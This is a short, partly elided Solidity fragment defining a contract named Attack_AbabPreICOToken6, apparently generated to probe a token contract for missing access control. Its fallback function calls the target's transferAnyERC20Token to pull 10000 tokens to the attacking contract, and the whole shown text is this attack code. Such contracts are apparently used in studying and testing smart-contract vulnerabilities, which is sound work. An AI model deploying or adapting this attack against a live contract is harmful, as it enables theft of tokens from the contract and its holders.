...
contract Attack_AbabPreICOToken6 {

  AbabPreICOToken public target_contract;

  function Attack_AbabPreICOToken6(address _targetContract) public payable {
  ...
  function() public payable {
    target_contract.transferAnyERC20Token(this,  10000);
  }
} 
